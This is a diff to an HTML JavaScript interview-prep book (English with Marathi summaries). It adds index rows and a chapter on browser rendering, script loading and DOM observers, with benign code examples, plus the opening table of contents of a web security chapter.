@@ -171,22 +171,27 @@ svg text { font-family: "Segoe UI", Arial, sans-serif; }
 <tr><td>79</td><td>Debouncing</td><td>What/why, how it works, use cases (search, button, resize), custom debounce implementation, debouncing vs throttling</td></tr>
 <tr><td>80</td><td>Throttling</td><td>What/why, how it works, benefits, scroll demo, 3 implementations (timestamp, flag+setTimeout, myThrottle), debounce vs throttle table</td></tr>
 <tr><td>81</td><td>Web Workers &amp; requestAnimationFrame</td><td>Main-thread blocking, postMessage, worker limits, smooth animations, cancelAnimationFrame</td></tr>
+<tr><td>82</td><td>Browser Rendering &amp; Performance</td><td>Critical rendering path, reflow vs repaint vs composite, layout thrashing, normal/async/defer/module scripts, DOMContentLoaded vs load, Virtual DOM &amp; keys, IntersectionObserver, MutationObserver, requestIdleCallback</td></tr>
+<tr><td>83</td><td>Web Security: XSS, CSRF &amp; CSP</td><td>Stored/reflected/DOM XSS, textContent &amp; escaping, DOMPurify, CSRF, SameSite cookies, CSRF tokens, Content Security Policy &amp; nonces, clickjacking, security headers, JWT storage</td></tr>
+<tr><td>84</td><td>Real-time &amp; Offline: WebSocket, SSE &amp; Service Worker</td><td>Polling vs long polling vs SSE vs WebSocket, reconnect with backoff, EventSource, Service Worker lifecycle, caching strategies, PWA, AbortController</td></tr>
 <!-- INDEX-PART-END 9 -->
 <tr class="part-row"><td colspan="3">PART 10 · Modern JS &amp; More</td></tr>
-<tr><td>82</td><td>The Math Object</td><td>PI, round, pow/**, sqrt, abs, ceil, floor, trunc, min/max, random (range formula), log; negative-number rounding, edge cases</td></tr>
-<tr><td>83</td><td>The Date Object</td><td>Creating dates (9 ways), UTC vs local parsing, toString vs toLocaleString, get/set methods, Date.now/parse, add days, difference in days, live clock</td></tr>
-<tr><td>84</td><td>ES6+ Features by Version (ES2015 → ES2023)</td><td>let/const, templates, destructuring, spread/rest, **, padStart, Object.entries, finally, flat, BigInt, ??, ?., replaceAll, logical assignment, numeric separators, findLast, toSorted, with</td></tr>
-<tr><td>85</td><td>ES6 Modules: export &amp; import</td><td>Named/default exports, import forms (named, namespace, default+named, rename), live bindings, strict mode, type="module", why the folder's demo fails</td></tr>
-<tr><td>86</td><td>Polyfills I: Array Methods</td><td>What a polyfill is; map, filter, forEach, reduce (+ fixes) and NEW: some, every, find, findIndex, includes, flat, Array.from</td></tr>
-<tr><td>87</td><td>Polyfills II: call, apply, bind, once &amp; Object Helpers</td><td>call/apply/bind (+ Symbol key, primitives, new), once; NEW: Object.assign, Object.create, deepClone</td></tr>
-<tr><td>88</td><td>Polyfills III: Promise &amp; Combinators</td><td>Your myPromise versions &amp; their bugs, all/allSettled/any/race polyfills, a spec-like MyPromise class (then chaining, microtasks, finally)</td></tr>
-<tr><td>89</td><td>Error Handling</td><td>try/catch/finally, error types, throw, custom errors, cause, async errors, best practices</td></tr>
-<tr><td>90</td><td>Iterators &amp; Generators</td><td>Iterator protocol, function*, yield, next(arg), yield*, return/throw, lazy sequences, async generators</td></tr>
-<tr><td>91</td><td>Memory Management &amp; Garbage Collection</td><td>Stack vs heap, reachability, mark-and-sweep, memory leaks, WeakMap/WeakSet/WeakRef, DevTools</td></tr>
+<tr><td>85</td><td>The Math Object</td><td>PI, round, pow/**, sqrt, abs, ceil, floor, trunc, min/max, random (range formula), log; negative-number rounding, edge cases</td></tr>
+<tr><td>86</td><td>The Date Object</td><td>Creating dates (9 ways), UTC vs local parsing, toString vs toLocaleString, get/set methods, Date.now/parse, add days, difference in days, live clock</td></tr>
+<tr><td>87</td><td>ES6+ Features by Version (ES2015 → ES2023)</td><td>let/const, templates, destructuring, spread/rest, **, padStart, Object.entries, finally, flat, BigInt, ??, ?., replaceAll, logical assignment, numeric separators, findLast, toSorted, with</td></tr>
+<tr><td>88</td><td>ES6 Modules: export &amp; import</td><td>Named/default exports, import forms (named, namespace, default+named, rename), live bindings, strict mode, type="module", why the folder's demo fails, CommonJS vs ESM, dynamic import(), tree shaking</td></tr>
+<tr><td>89</td><td>Polyfills I: Array Methods</td><td>What a polyfill is; map, filter, forEach, reduce (+ fixes) and NEW: some, every, find, findIndex, includes, flat, Array.from</td></tr>
+<tr><td>90</td><td>Polyfills II: call, apply, bind, once &amp; Object Helpers</td><td>call/apply/bind (+ Symbol key, primitives, new), once; NEW: Object.assign, Object.create, deepClone</td></tr>
+<tr><td>91</td><td>Polyfills III: Promise &amp; Combinators</td><td>Your myPromise versions &amp; their bugs, all/allSettled/any/race polyfills, a spec-like MyPromise class (then chaining, microtasks, finally)</td></tr>
+<tr><td>92</td><td>Error Handling</td><td>try/catch/finally, error types, throw, custom errors, cause, async errors, best practices</td></tr>
+<tr><td>93</td><td>Iterators &amp; Generators</td><td>Iterator protocol, function*, yield, next(arg), yield*, return/throw, lazy sequences, async generators</td></tr>
+<tr><td>94</td><td>Memory Management &amp; Garbage Collection</td><td>Stack vs heap, reachability, mark-and-sweep, memory leaks, WeakMap/WeakSet/WeakRef, DevTools</td></tr>
+<tr><td>95</td><td>Design Patterns in JavaScript</td><td>Module, Factory, Observer, Pub-Sub, Observer vs Pub-Sub, Mixin, composition over inheritance</td></tr>
+<tr><td>96</td><td>Machine Coding: Implement-It Questions</td><td>EventEmitter (on/off/once/emit), LRU Cache, deepEqual, promisify, retry with backoff, concurrency limit, compose/pipe, flattenObject, get(obj, path)</td></tr>
 <!-- INDEX-PART-END 10 -->
 <tr class="part-row"><td colspan="3">PART 11 · Mock Interviews</td></tr>
-<tr><td>92</td><td>Mock Interview I: Coding Tasks &amp; Core Q&amp;A</td><td>Students map/filter, factorial, reverse, array &amp; string methods, structuredClone, event loop, promise states, typeof</td></tr>
-<tr><td>93</td><td>Mock Interview II: Output Questions, Async &amp; ES6</td><td>Global leak, object equality &amp; keys, string interleave, currying, copies, pure functions, transpiling, ES6, promises on click, await, ES5 vs ES6</td></tr>
+<tr><td>97</td><td>Mock Interview I: Coding Tasks &amp; Core Q&amp;A</td><td>Students map/filter, factorial, reverse, array &amp; string methods, structuredClone, event loop, promise states, typeof</td></tr>
+<tr><td>98</td><td>Mock Interview II: Output Questions, Async &amp; ES6</td><td>Global leak, object equality &amp; keys, string interleave, currying, copies, pure functions, transpiling, ES6, promises on click, await, ES5 vs ES6</td></tr>
 <!-- INDEX-PART-END 11 -->
 <!-- NEXT-INDEX-ROW: add new parts above this line -->
 </table>
@@ -23056,7 +23061,7 @@ new Single() === new Single();   // true</pre>
 <pre>// b) the ES-module singleton (the simplest and most common in real apps)
 // config.js
 const config = { apiUrl: "/api", debug: false };
-export default config;           // every import gets the SAME object (modules run once, Chapter 85)
+export default config;           // every import gets the SAME object (modules run once, Chapter 88)
 // c) freeze it if nobody should change it: export default Object.freeze(config);</pre>
 <div class="ex"><ul class="pl"><li><b>What happens:</b> a module runs only once; every import gets the same exported object.</li><li><b>Output:</b> (no output).</li><li><span class="adv">✅ The simplest and most common singleton in real apps; freeze it to prevent changes.</span></li></ul></div>
 <b>Pros:</b> one shared state, controlled creation, lazy loading. <b>Cons:</b> hidden global state, harder unit testing (state leaks between tests), tight coupling; prefer passing dependencies explicitly when you can.</div>
@@ -29239,14 +29244,616 @@ stopButton.onclick = () =&gt; cancelAnimationFrame(id);   // stop the scheduled 
 
 <!-- ===== END OF CHAPTER 81 ===== -->
 
+
+<div class="chapter">Chapter 82: Browser Rendering &amp; Performance<small>critical rendering path · DOM + CSSOM · layout · paint · composite · reflow vs repaint · layout thrashing · script loading: normal vs async vs defer vs module · Virtual DOM · IntersectionObserver · MutationObserver · requestIdleCallback</small></div>
+<div class="toc"><b>CHAPTER 82 INDEX</b>
+<ol><li>The Critical Rendering Path</li><li>Reflow vs Repaint (and Composite)</li><li>Layout Thrashing</li><li>Script Loading: normal, async, defer, module</li><li>Virtual DOM</li><li>IntersectionObserver</li><li>MutationObserver</li><li>requestIdleCallback</li><li>Interview Questions (Detailed)</li><li>Quick Revision Summary</li></ol></div>
+<div class="box more"><b>Note:</b> this chapter has no source folder. It was added to fill interview gaps (rendering, script loading and observers are asked very often in frontend interviews).</div>
+
+<h2>1. The Critical Rendering Path</h2>
+<div class="box def"><b>Definition:</b> The <b>Critical Rendering Path (CRP)</b> is the sequence of steps the browser follows to turn HTML, CSS and JavaScript into pixels on the screen: <b>parse HTML → DOM</b>, <b>parse CSS → CSSOM</b>, combine them into the <b>Render Tree</b>, calculate geometry (<b>Layout</b>), fill in pixels (<b>Paint</b>) and put the layers together (<b>Composite</b>). Optimising the CRP means making the first meaningful paint happen as early as possible.</div>
+<div class="fig"><svg viewBox="0 0 660 150" width="620"><g font-family="sans-serif" font-size="12">
+<rect x="10" y="15" width="90" height="36" rx="6" fill="#eef4ff" stroke="#2c5aa0"/><text x="55" y="38" text-anchor="middle">HTML → DOM</text>
+<rect x="10" y="95" width="90" height="36" rx="6" fill="#eef4ff" stroke="#2c5aa0"/><text x="55" y="118" text-anchor="middle">CSS → CSSOM</text>
+<line x1="100" y1="33" x2="140" y2="65" stroke="#2c5aa0" stroke-width="2"/><line x1="100" y1="113" x2="140" y2="85" stroke="#2c5aa0" stroke-width="2"/>
+<rect x="140" y="55" width="100" height="40" rx="6" fill="#fff7e6" stroke="#f0a020"/><text x="190" y="80" text-anchor="middle">Render Tree</text>
+<line x1="240" y1="75" x2="275" y2="75" stroke="#555" stroke-width="2"/>
+<rect x="275" y="55" width="100" height="40" rx="6" fill="#fdecea" stroke="#c0392b"/><text x="325" y="73" text-anchor="middle">Layout</text><text x="325" y="88" text-anchor="middle" font-size="10">(reflow)</text>
+<line x1="375" y1="75" x2="410" y2="75" stroke="#555" stroke-width="2"/>
+<rect x="410" y="55" width="100" height="40" rx="6" fill="#fff7e6" stroke="#f0a020"/><text x="460" y="73" text-anchor="middle">Paint</text><text x="460" y="88" text-anchor="middle" font-size="10">(repaint)</text>
+<line x1="510" y1="75" x2="545" y2="75" stroke="#555" stroke-width="2"/>
+<rect x="545" y="55" width="105" height="40" rx="6" fill="#eafaf1" stroke="#27ae60"/><text x="597" y="73" text-anchor="middle">Composite</text><text x="597" y="88" text-anchor="middle" font-size="10">(GPU, cheap)</text>
+<text x="330" y="135" text-anchor="middle" fill="#c0392b">a &lt;script&gt; without async/defer pauses HTML parsing; CSS blocks rendering</text></g></svg>
+<div class="cap">Figure 147: The Critical Rendering Path, from bytes to pixels.</div></div>
+<ol class="pl">
+<li><b>DOM:</b> HTML is parsed top to bottom into the DOM tree.</li>
+<li><b>CSSOM:</b> all CSS is parsed into the CSSOM. CSS is <b>render-blocking</b>: nothing is painted until the CSSOM is ready.</li>
+<li><b>Render Tree:</b> only visible nodes (elements with <code>display: none</code> and <code>&lt;head&gt;</code> are skipped; <code>visibility: hidden</code> IS included, it just takes space).</li>
+<li><b>Layout:</b> the position and size of every box is calculated.</li>
+<li><b>Paint:</b> colours, text, borders, shadows and images are drawn into layers.</li>
+<li><b>Composite:</b> the layers are combined (on the GPU) in the right order.</li>
+</ol>
+<div class="box mr">Browser HTML पासून DOM आणि CSS पासून CSSOM बनवतो. दोन्ही एकत्र करून Render Tree बनते. नंतर Layout (कोण कुठे, किती मोठे), Paint (रंग, text) आणि Composite (layers एकत्र) होते. CSS render-blocking असतो आणि साधा &lt;script&gt; HTML parsing थांबवतो.</div>
+<div class="box more"><b>Extra Details: how to speed up the CRP</b>
+<ul class="pl"><li>Put CSS in <code>&lt;head&gt;</code> and keep it small (inline critical CSS, lazy-load the rest).</li><li>Use <code>defer</code> / <code>async</code> / <code>type="module"</code> for scripts (section 4).</li><li>Compress and lazy-load images (<code>loading="lazy"</code>), set width/height so layout doesn't jump (CLS).</li><li>Use <code>&lt;link rel="preload"&gt;</code> for critical fonts/files and <code>preconnect</code> for third-party origins.</li></ul></div>
+
+<h2>2. Reflow vs Repaint (and Composite)</h2>
+<div class="box def"><b>Definition:</b> A <b>reflow</b> (layout) is the browser recalculating the size and position of elements; it happens when geometry changes. A <b>repaint</b> is redrawing pixels without changing geometry (colour, background, visibility). Reflow is the most expensive, because it is usually followed by a repaint and can affect parents, children and siblings. Changes to <code>transform</code> and <code>opacity</code> usually skip both and only need <b>composite</b>.</div>
+<div class="code-title">Example 1: what triggers what</div>
+<pre>const box = document.querySelector(".box");
+
+// ─── Reflow + repaint (geometry changes) ───
+box.style.width = "300px";          // → layout + paint
+box.style.margin = "20px";          // → layout + paint
+box.textContent = "longer text";    // → layout + paint (size may change)
+
+// ─── Repaint only (no geometry change) ───
+box.style.color = "red";            // → paint
+box.style.backgroundColor = "#eee"; // → paint
+box.style.visibility = "hidden";    // → paint (still takes space)
+
+// ─── Composite only (cheapest) ───
+box.style.transform = "translateX(100px)";   // → composite
+box.style.opacity = "0.5";                   // → composite</pre>
+<div class="ex"><b>What happens:</b> changing size/position/content forces layout; changing only colours forces paint; transform/opacity are handled by the compositor (GPU).
+<br><span class="adv">✅ Animate with transform and opacity, not top/left/width.</span>
+<br><span class="dis">⚠ display: none → removes the element from layout (reflow); visibility: hidden → only repaint.</span></div>
+<table><tr><th>Change</th><th>Layout (reflow)</th><th>Paint</th><th>Composite</th></tr>
+<tr><td>width, height, margin, padding, top/left, font-size, adding/removing nodes</td><td>✔</td><td>✔</td><td>✔</td></tr>
+<tr><td>color, background, box-shadow, visibility</td><td>✖</td><td>✔</td><td>✔</td></tr>
+<tr><td>transform, opacity</td><td>✖</td><td>✖</td><td>✔</td></tr></table>
+<div class="box mr">Reflow म्हणजे elements ची size/position पुन्हा मोजणे (महाग). Repaint म्हणजे फक्त रंग बदलून पुन्हा काढणे (स्वस्त). transform आणि opacity बदलल्यास फक्त composite होते (सर्वात स्वस्त), म्हणून animation साठी तेच वापरा.</div>
+
+<h2>3. Layout Thrashing</h2>
+<div class="box def"><b>Definition:</b> <b>Layout thrashing</b> (forced synchronous layout) happens when code alternately WRITES a style and then READS a layout property (offsetHeight, getBoundingClientRect, scrollTop…) in a loop. Each read forces the browser to do a fresh reflow immediately, instead of one reflow at the end of the frame.</div>
+<div class="code-title">Example 2: thrashing vs batching</div>
+<pre>const items = document.querySelectorAll(".item");
+
+// ─── ❌ Bad: read → write → read → write (one reflow per item) ───
+items.forEach(el =&gt; {
+  const h = el.offsetHeight;          // READ  → forces layout
+  el.style.height = h * 2 + "px";     // WRITE → invalidates layout
+});
+
+// ─── ✅ Good: read everything first, then write everything ───
+const heights = [...items].map(el =&gt; el.offsetHeight);   // all READS
+items.forEach((el, i) =&gt; {
+  el.style.height = heights[i] * 2 + "px";               // all WRITES
+});                                                       // → one reflow</pre>
+<div class="ex"><b>What happens:</b> in the bad version, every offsetHeight read must return a correct value, so the browser recalculates layout for every item (N reflows). In the good version, layout is computed once for the reads and once after the writes.
+<br><span class="adv">✅ Other fixes: change a class instead of many inline styles, build nodes in a DocumentFragment and append once, do visual writes inside requestAnimationFrame (Chapter 81).</span></div>
+<div class="box mr">Loop मध्ये आधी style बदलणे आणि लगेच offsetHeight सारखी value वाचणे, असे आलटून पालटून केल्यास प्रत्येक वेळी reflow होतो. त्याला layout thrashing म्हणतात. उपाय: आधी सर्व values वाचा, मग सर्व बदल एकदम करा.</div>
+
+<h2>4. Script Loading: normal, async, defer, module</h2>
+<div class="box def"><b>Definition:</b> A normal <code>&lt;script&gt;</code> <b>stops HTML parsing</b> while it downloads and runs. <code>async</code> downloads in parallel and runs <b>as soon as it is downloaded</b> (order not guaranteed, may interrupt parsing). <code>defer</code> downloads in parallel and runs <b>after the HTML is fully parsed, in document order</b>, just before <code>DOMContentLoaded</code>. <code>type="module"</code> scripts are deferred by default.</div>
+<div class="code-title">Example 3: the four ways to load a script</div>
+<pre>&lt;script src="a.js"&gt;&lt;/script&gt;               &lt;!-- blocks parsing, runs immediately --&gt;
+&lt;script async src="analytics.js"&gt;&lt;/script&gt;  &lt;!-- parallel download, runs ASAP, any order --&gt;
+&lt;script defer src="app.js"&gt;&lt;/script&gt;        &lt;!-- parallel download, runs after parsing, in order --&gt;
+&lt;script type="module" src="main.js"&gt;&lt;/script&gt; &lt;!-- deferred by default (add async to make it async) --&gt;</pre>
+<div class="ex"><b>What happens:</b> the browser's HTML parser treats each tag differently (see the figure). defer scripts can safely use the DOM; async scripts may run before the DOM is ready.
+<br><span class="adv">✅ Use defer for your app code that needs the DOM or depends on other scripts; async for independent scripts (analytics, ads).</span>
+<br><span class="dis">⚠ async/defer only work for external scripts (with src); they are ignored on inline scripts (except type="module" with async).</span></div>
+<div class="fig"><svg viewBox="0 0 660 200" width="620"><g font-family="sans-serif" font-size="11">
+<text x="10" y="35" font-weight="bold">normal</text><text x="10" y="85" font-weight="bold">async</text><text x="10" y="135" font-weight="bold">defer</text>
+<rect x="80" y="22" width="120" height="18" fill="#2c5aa0"/><rect x="200" y="22" width="70" height="18" fill="#f0a020"/><rect x="270" y="22" width="40" height="18" fill="#c0392b"/><rect x="310" y="22" width="200" height="18" fill="#2c5aa0"/>
+<rect x="80" y="72" width="170" height="18" fill="#2c5aa0"/><rect x="120" y="92" width="100" height="10" fill="#f0a020"/><rect x="250" y="72" width="40" height="18" fill="#c0392b"/><rect x="290" y="72" width="170" height="18" fill="#2c5aa0"/>
+<rect x="80" y="122" width="380" height="18" fill="#2c5aa0"/><rect x="120" y="142" width="100" height="10" fill="#f0a020"/><rect x="460" y="122" width="40" height="18" fill="#c0392b"/>
+<rect x="80" y="172" width="14" height="12" fill="#2c5aa0"/><text x="100" y="182">HTML parsing</text><rect x="200" y="172" width="14" height="12" fill="#f0a020"/><text x="220" y="182">script download</text><rect x="330" y="172" width="14" height="12" fill="#c0392b"/><text x="350" y="182">script execution</text></g></svg>
+<div class="cap">Figure 148: normal scripts pause parsing; async runs as soon as downloaded; defer runs after parsing.</div></div>
+<table><tr><th></th><th>normal</th><th>async</th><th>defer</th><th>type="module"</th></tr>
+<tr><td>Blocks parsing while downloading</td><td>Yes</td><td>No</td><td>No</td><td>No</td></tr>
+<tr><td>When it runs</td><td>Immediately</td><td>When downloaded</td><td>After parsing</td><td>After parsing</td></tr>
+<tr><td>Order kept</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td></tr>
+<tr><td>DOM ready when it runs</td><td>Only above it</td><td>Not guaranteed</td><td>Yes</td><td>Yes</td></tr></table>
+<div class="box mr">साधा script HTML parsing थांबवतो. async: parallel download, download होताच चालतो, order नक्की नाही. defer: parallel download, पूर्ण HTML parse झाल्यावर order मध्ये चालतो. Module scripts default ने defer असतात. DOM लागणाऱ्या code साठी defer वापरा.</div>
+<div class="box more"><b>Extra Details: DOMContentLoaded vs load</b>
+<ul class="pl"><li><code>DOMContentLoaded</code>: HTML fully parsed and all defer scripts have run (images/styles may still be loading).</li><li><code>load</code> (window): everything, including images, iframes and styles, has finished loading.</li><li>Putting a normal script at the end of <code>&lt;body&gt;</code> was the old way to get "DOM ready"; defer in <code>&lt;head&gt;</code> is better because the download starts earlier.</li></ul></div>
+
+<h2>5. Virtual DOM</h2>
+<div class="box def"><b>Definition:</b> The <b>Virtual DOM</b> is a lightweight JavaScript object tree that describes what the UI should look like. When state changes, a library (React, Vue) builds a new virtual tree, <b>diffs</b> it with the previous one (<b>reconciliation</b>) and applies only the minimal real DOM changes (<b>patching</b>). It is not part of the browser; it is a pattern used by libraries.</div>
+<div class="code-title">Example 4: a tiny virtual DOM (concept)</div>
+<pre>// ─── a virtual node is just an object ───
+const h = (type, props, ...children) =&gt; ({ type, props: props || {}, children });
+
+const oldTree = h("ul", null, h("li", null, "A"), h("li", null, "B"));
+const newTree = h("ul", null, h("li", null, "A"), h("li", null, "C"));
+
+// ─── diff: compare old vs new and collect changes ───
+function diff(a, b, path = "root") {
+  if (typeof a === "string" || typeof b === "string")
+    return a === b ? [] : [`${path}: text "${a}" → "${b}"`];
+  if (a.type !== b.type) return [`${path}: replace &lt;${a.type}&gt; with &lt;${b.type}&gt;`];
+  return b.children.flatMap((child, i) =&gt; diff(a.children[i], child, `${path}/${b.type}[${i}]`));
+}
+console.log(diff(oldTree, newTree));
+// → [ 'root/ul[1]/li[0]: text "B" → "C"' ]   (only ONE real DOM update needed)</pre>
+<div class="ex"><b>What happens:</b> both trees are plain objects, so comparing them is fast. The diff finds that only the second li's text changed, so only that one text node is updated in the real DOM.
+<br><b>Output:</b> [ 'root/ul[1]/li[0]: text "B" → "C"' ]
+<br><span class="adv">✅ Advantage: you write the UI declaratively ("this is what it looks like for this state") and the library does the minimal DOM work; batches many updates into one.</span>
+<br><span class="dis">⚠ Virtual DOM is not "faster than the DOM": it adds diffing work. Carefully written direct DOM updates are faster; the VDOM wins on developer productivity with good-enough speed. Svelte/Solid skip the VDOM entirely.</span></div>
+<div class="box more"><b>Extra Details: keys</b> In lists, a <b>key</b> tells the diff which old item matches which new item. Without stable keys (or with the array index as key), inserting at the top makes the library think EVERY item changed and can mix up input state. Use a unique id as key.</div>
+<div class="box mr">Virtual DOM म्हणजे UI चे JavaScript object मधील हलके copy. State बदलल्यावर नवीन virtual tree बनते, जुन्याशी तुलना (diff) होते आणि फक्त बदललेला भाग खऱ्या DOM मध्ये update होतो. हे React/Vue सारख्या libraries चे pattern आहे, browser चे नाही.</div>
+
+<h2>6. IntersectionObserver</h2>
+<div class="box def"><b>Definition:</b> <code>IntersectionObserver</code> runs a callback asynchronously when an observed element enters or leaves the viewport (or another root element) by a given threshold. It replaces scroll listeners + getBoundingClientRect for lazy loading, infinite scroll and "seen" analytics, without causing layout thrashing.</div>
+<div class="code-title">Example 5: lazy-load images</div>
+<pre>// &lt;img data-src="photo.jpg" class="lazy"&gt;
+const io = new IntersectionObserver((entries, observer) =&gt; {
+  entries.forEach(entry =&gt; {
+    if (!entry.isIntersecting) return;
+    const img = entry.target;
+    img.src = img.dataset.src;       // start the real download
+    observer.unobserve(img);         // only once per image
+  });
+}, { rootMargin: "200px", threshold: 0 });   // start 200px before it is visible
+
+document.querySelectorAll("img.lazy").forEach(img =&gt; io.observe(img));</pre>
+<div class="ex"><b>What happens:</b> the browser calls the callback with entries whenever an image crosses the threshold. When it is about to be visible, data-src is copied to src.
+<br><span class="adv">✅ No scroll event spam, no forced layout; for plain images, <code>&lt;img loading="lazy"&gt;</code> is even simpler.</span></div>
+<div class="code-title">Example 6: infinite scroll with a sentinel</div>
+<pre>const sentinel = document.querySelector("#load-more");   // empty div at the end of the list
+let loading = false;
+new IntersectionObserver(async ([entry]) =&gt; {
+  if (!entry.isIntersecting || loading) return;
+  loading = true;
+  const items = await fetchNextPage();
+  list.append(...items.map(renderItem));
+  loading = false;
+}).observe(sentinel);</pre>
+<div class="ex"><b>What happens:</b> when the empty sentinel div at the bottom scrolls into view, the next page is fetched and appended; the sentinel moves down again.
+<br><span class="dis">⚠ Guard with a loading flag, otherwise fast scrolling can trigger duplicate requests.</span></div>
+<div class="box mr">IntersectionObserver सांगतो की element screen (viewport) मध्ये आला की बाहेर गेला. Lazy loading images आणि infinite scroll साठी वापरतात. scroll event पेक्षा efficient, कारण browser स्वतः तपासतो.</div>
+
+<h2>7. MutationObserver</h2>
+<div class="box def"><b>Definition:</b> <code>MutationObserver</code> watches a DOM node and calls a callback (as a <b>microtask</b>, batched) when its children, attributes or text change. Used to react to DOM changes made by other code (third-party widgets, frameworks).</div>
+<div class="code-title">Example 7: watch a list for added items</div>
+<pre>const list = document.querySelector("#list");
+const mo = new MutationObserver(mutations =&gt; {
+  for (const m of mutations) {
+    if (m.type === "childList") console.log("added:", m.addedNodes.length);
+    if (m.type === "attributes") console.log("attr changed:", m.attributeName);
+  }
+});
+mo.observe(list, { childList: true, attributes: true, subtree: true });
+
+list.append(document.createElement("li"));
+list.append(document.createElement("li"));
+list.setAttribute("data-x", "1");
+// → added: 1
+// → added: 1
+// → attr changed: data-x      (all three delivered together in ONE callback, after the sync code)
+mo.disconnect();   // stop watching (avoid memory leaks)</pre>
+<div class="ex"><b>What happens:</b> each change creates a MutationRecord; records are collected and delivered together in one microtask after the current script.
+<br><span class="dis">⚠ Changing the DOM inside the callback for the same target can cause an infinite loop.</span></div>
+<div class="box mr">MutationObserver DOM मध्ये बदल (child add/remove, attribute, text) झाल्यावर callback चालवतो. सर्व बदल एकत्र करून microtask मध्ये देतो. काम संपल्यावर disconnect() करा.</div>
+
+<h2>8. requestIdleCallback</h2>
+<div class="box def"><b>Definition:</b> <code>requestIdleCallback(fn, { timeout })</code> runs low-priority work when the browser is idle (after a frame is finished). The callback gets a <code>deadline</code> with <code>timeRemaining()</code> so you can do small chunks of work without hurting scrolling or animation.</div>
+<div class="code-title">Example 8: process a queue in idle time</div>
+<pre>const queue = [...logs];   // e.g. analytics events to send
+function work(deadline) {
+  while (deadline.timeRemaining() &gt; 1 &amp;&amp; queue.length) send(queue.shift());
+  if (queue.length) requestIdleCallback(work, { timeout: 2000 });   // continue later
+}
+requestIdleCallback(work, { timeout: 2000 });   // timeout: run within 2 s even if never idle</pre>
+<div class="ex"><b>What happens:</b> each call does work only while there is idle time left in the frame, then schedules itself again.
+<br><span class="dis">⚠ Not supported in older Safari; don't change the DOM inside it (use requestAnimationFrame for visual work).</span></div>
+<div class="box mr">requestIdleCallback browser मोकळा असताना कमी महत्त्वाचे काम (analytics, preload) चालवतो. timeRemaining() पाहून छोटे छोटे तुकडे करा.</div>
+
+<h2>9. Interview Questions (Detailed)</h2>
+<div class="q">Q1. What happens when you type a URL and press Enter (frontend part)?</div>
+<p>DNS lookup → TCP/TLS connection → HTTP request → HTML response. The browser parses HTML into the DOM, fetches CSS (CSSOM) and scripts, builds the render tree, does layout, paint and composite. Scripts without async/defer pause parsing; DOMContentLoaded fires after parsing, load after all resources.</p>
+<div class="q">Q2. Difference between reflow and repaint? How do you reduce them?</div>
+<p>Reflow recalculates geometry (expensive, cascades); repaint redraws pixels without geometry change. Reduce: batch DOM reads/writes, change classes not many styles, use DocumentFragment, animate transform/opacity, avoid table layouts, use will-change sparingly.</p>
+<div class="q">Q3. async vs defer?</div>
+<p>Both download in parallel. async runs as soon as it arrives (any order, maybe before DOM is ready); defer runs after parsing, in order, before DOMContentLoaded. Modules behave like defer.</p>
+<div class="q">Q4. Is the Virtual DOM faster than the real DOM?</div>
+<p>No, it adds overhead. It is a way to compute minimal updates automatically from declarative UI code; the expensive part (real DOM changes) is minimised and batched.</p>
+<div class="q">Q5. Why are keys important in lists?</div>
+<p>They let the diff match old and new items. Index keys break when items are inserted/removed/reordered, causing wrong re-renders and lost input state.</p>
+<div class="q">Q6. How would you implement lazy loading / infinite scroll?</div>
+<p>IntersectionObserver on images (or loading="lazy") and on a sentinel element at the end of the list; avoid scroll listeners with getBoundingClientRect.</p>
+<div class="q">Q7. display: none vs visibility: hidden vs opacity: 0?</div>
+<p>display: none removes it from layout (reflow, no space, no events). visibility: hidden keeps its space, no events (repaint). opacity: 0 keeps space AND still receives clicks (composite only).</p>
+<div class="q">Q8. Output-based questions</div>
+<pre>// index.html: &lt;script defer src="1.js"&gt;  &lt;script defer src="2.js"&gt;   (2.js is smaller, downloads first)
+// → 1.js runs first, then 2.js   (defer keeps document order)
+
+// &lt;script async src="1.js"&gt;  &lt;script async src="2.js"&gt;   (2.js downloads first)
+// → 2.js runs first              (async: first downloaded, first run)
+
+document.addEventListener("DOMContentLoaded", () =&gt; console.log("DCL"));
+window.addEventListener("load", () =&gt; console.log("load"));
+// → DCL, then load              (load waits for images, styles, iframes)
+
+new MutationObserver(() =&gt; console.log("mutation")).observe(document.body, { childList: true });
+document.body.append("x"); console.log("sync");
+Promise.resolve().then(() =&gt; console.log("promise"));
+// → sync, mutation, promise     (mutation callback is a microtask queued BEFORE the promise)</pre>
+<div class="ex"><ul class="pl"><li><b>What happens:</b> defer keeps order, async doesn't; DOMContentLoaded comes before load; MutationObserver callbacks are microtasks queued at the moment of the change.</li><li><b>Output:</b> as shown in the comments.</li></ul></div>
+
+<h2>10. Quick Revision Summary</h2>
+<table><tr><th>Topic</th><th>Remember</th></tr>
+<tr><td>CRP</td><td>DOM + CSSOM → Render Tree → Layout → Paint → Composite</td></tr>
+<tr><td>Reflow</td><td>Geometry change, expensive</td></tr>
+<tr><td>Repaint</td><td>Visual change only</td></tr>
+<tr><td>Composite</td><td>transform / opacity, cheapest</td></tr>
+<tr><td>Layout thrashing</td><td>Read-write-read-write; batch reads then writes</td></tr>
+<tr><td>async / defer</td><td>ASAP, any order / after parsing, in order</td></tr>
+<tr><td>Virtual DOM</td><td>JS tree + diff + patch; keys matter</td></tr>
+<tr><td>IntersectionObserver</td><td>Visibility → lazy load, infinite scroll</td></tr>
+<tr><td>MutationObserver</td><td>DOM changes, microtask</td></tr>
+<tr><td>requestIdleCallback</td><td>Low-priority idle work</td></tr></table>
+<div class="box mr">थोडक्यात: browser DOM+CSSOM → layout → paint → composite करतो. Reflow महाग, repaint कमी महाग, transform/opacity सर्वात स्वस्त. DOM साठी script ला defer लावा. Virtual DOM diff करून कमी DOM बदल करतो. Visibility साठी IntersectionObserver, DOM बदलांसाठी MutationObserver.</div>
+
+<!-- ===== END OF CHAPTER 82 ===== -->
+
+<div class="chapter">Chapter 83: Web Security: XSS, CSRF &amp; CSP<small>XSS (stored, reflected, DOM-based) · escaping &amp; textContent · sanitising · CSRF · SameSite cookies · CSRF tokens · Content Security Policy · clickjacking · other security headers</small></div>
+<div class="toc"><b>CHAPTER 83 INDEX</b>
+<ol><li>XSS (Cross-Site Scripting)</li><li>Preventing XSS</li><li>CSRF (Cross-Site Request Forgery)</li><li>Preventing CSRF</li><li>Content Security Policy (CSP)</li><li>Clickjacking &amp; Other Security Headers</li><li>Interview Questions (Detailed)</li><li>Quick Revision Summary</li></ol></div>
+<div class="box more"><b>Note:</b> this chapter has no source folder. It was added to fill interview gaps; it builds on Chapter 71 (cookies) and Chapter 72 (CORS).</div>
+
